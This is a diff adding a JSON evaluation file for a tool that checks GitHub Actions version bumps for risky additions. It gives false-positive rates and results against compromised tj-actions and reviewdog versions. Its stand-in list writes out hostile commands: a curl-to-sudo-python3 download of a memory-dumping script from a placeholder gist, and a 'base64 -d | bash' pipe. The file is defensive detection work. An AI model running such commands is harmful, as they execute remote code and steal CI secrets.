@@ -1,0 +1,67 @@
+{
+  "date": "2026-11-18",
+  "version": "0.8.10",
+  "ceilings": "https://github.com/openyard-cloud/vetcode/issues/72#issuecomment-6966267586",
+  "clean": {
+    "bumps": 60,
+    "anyAddition": 22,
+    "anyRate": "36.7%",
+    "serious": [
+      "codecov/codecov-action v5.5.5 -> v7.1.0: reads INPUT_CODECOV_TOKEN; reads INPUT_TOKEN"
+    ],
+    "seriousRate": "1.7%",
+    "byKind": {
+      "abilities": 2,
+      "hosts": 9,
+      "programs": 9,
+      "env": 19,
+      "uses": 0,
+      "secrets": 1
+    },
+    "afterFixes": {
+      "anyRate": "36.7%",
+      "seriousRate": "1.7%",
+      "note": "in-sample: the two fixes came after the first look"
+    }
+  },
+  "real": {
+    "firstLook": {
+      "run": "https://github.com/openyard-cloud/vetcode/actions/runs/44217742511",
+      "results": [
+        "tj-actions/changed-files v45.0.7 -> 0e58ed8: could not download it from GitHub",
+        "reviewdog/action-setup v1.3.0 -> f0d342d: nothing"
+      ]
+    },
+    "afterReadingGITHUB_ACTION_PATHScripts": {
+      "run": "https://github.com/openyard-cloud/vetcode/actions/runs/44218326047",
+      "reviewdogAdds": {
+        "abilities": [],
+        "programs": [
+          "base64"
+        ],
+        "hosts": [],
+        "env": [
+          "RUNNER_ENVIRONMENT",
+          "RUNNER_OS",
+          "SCRIPT_RUNNER",
+          "VALUES"
+        ],
+        "files": [
+          "install.sh",
+          "check-installed.sh"
+        ]
+      }
+    },
+    "afterDecodedPipeRule": {
+      "run": "https://github.com/openyard-cloud/vetcode/actions/runs/44218565065",
+      "results": [
+        "tj-actions/changed-files v45.0.7 -> 0e58ed8: could not download it from GitHub",
+        "reviewdog/action-setup v1.3.0 -> f0d342d: adds, nothing serious"
+      ]
+    }
+  },
+  "standins": [
+    "tj-actions/changed-files: serious: downloads and runs code: curl -sSf https://gist.githubusercontent.com/example/0000/raw/memdump.py | sudo python3; reads the runner's process memory: memdump; reads INPUT_TOKEN",
+    "reviewdog/action-setup: serious: downloads and runs code: base64 -d | bash"
+  ]
+}
